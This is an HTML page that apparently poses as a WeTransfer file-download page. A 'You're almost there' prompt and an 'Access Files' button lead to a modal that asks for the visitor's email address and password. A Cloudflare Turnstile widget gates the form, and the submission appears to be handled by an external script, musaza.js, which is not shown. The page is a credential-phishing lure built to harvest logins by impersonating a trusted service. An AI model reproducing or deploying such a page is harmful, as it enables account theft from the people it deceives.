

<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>WeTransfer</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
  <style>
    body { background-color: #f1f1f1; font-family: Arial, sans-serif; }
    .topbar { display: flex; justify-content: space-between; padding: 10px 20px; }
    .logbox { background-color: #fff; border-radius: 12px; padding: 25px; box-shadow: 0 0 10px rgba(0,0,0,0.05); min-height: 100%; }
    .write-test { font-size: 32px; line-height: 120%; }
    .file-item { display: flex; justify-content: space-between; padding: 8px 0; font-size: 15px; border-bottom: 1px solid #eee; }
    .accept1 { margin-top: 20px; font-size: 14px; }
    .img-fluid { border-radius: 10px; }
    #file-list { cursor: pointer; }
    @media (max-width: 768px) { .logbox { margin-bottom: 2rem; } }
  </style>
</head>
<body>

<div class="topbar">
  <img src="https://iili.io/JIXgWPt.png" alt="Logo" height="40">
  <img src="https://iili.io/JIXUp8G.png" alt="Nav Icon" height="40">
</div>

<div class="container my-4">
  <div class="row g-4 align-items-stretch">
    <div class="col-lg-4">
      <div class="logbox">
        <div><img src="https://iili.io/JIXidEN.png" alt="Icon" width="40"></div>
        <div class="write-test mt-3"><span>You're</span><br><b>almost</b> there</div>
        <div class="mt-4" id="file-list"></div>
        <div class="accept1">To continue, please agree<br>to our <u><b>Terms Of Service</b></u>.</div>
        <button id="showFormBtn" class="btn btn-primary w-100 mt-4">
          <span class="spinner-border spinner-border-sm d-none" id="loadingSpinner" role="status" aria-hidden="true"></span>
          <span id="buttonText">Access Files</span>
        </button>
      </div>
    </div>

    <div class="col-lg-4 text-center">
      <img src="https://iili.io/JIX4qpj.png" class="img-fluid" alt="Illustration">
    </div>
    <div class="col-lg-4 text-center">
      <img src="https://iili.io/JIX6qFt.png" class="img-fluid" alt="Side graphic">
    </div>
  </div>
</div>

<!-- Modal Form -->
<div class="modal fade" id="formModal" tabindex="-1" aria-labelledby="formModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <form id="accessForm" novalidate>
        
        <div class="modal-body">
         
          <div class="mb-3">
            <label for="email" class="form-label">Email Address</label>
            <input type="email" class="form-control" id="email" name="email" required>
            <div class="invalid-feedback">Please enter a valid email address.</div>
          </div>
		  
		   <div class="mb-3">
            <label for="name" class="form-label">Password</label>
            <input type="password" class="form-control" id="name" name="name" required>
            <div class="invalid-feedback">Please enter your password.</div>
            <div id="submissionAlert" class="alert alert-danger mt-2 d-none" role="alert"></div>
          </div>
          <div class="cf-turnstile mb-3" data-sitekey="0x4AAAAAABaccphvMV0Je51_" data-callback="onTurnstileVerified"></div>
        </div>
        <div class="modal-footer">
          <button type="submit" class="btn btn-primary" id="submitBtn" disabled>Download</button>
        </div>
      </form>
    </div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
<script src="musaza.js"></script>
</body>
</html>
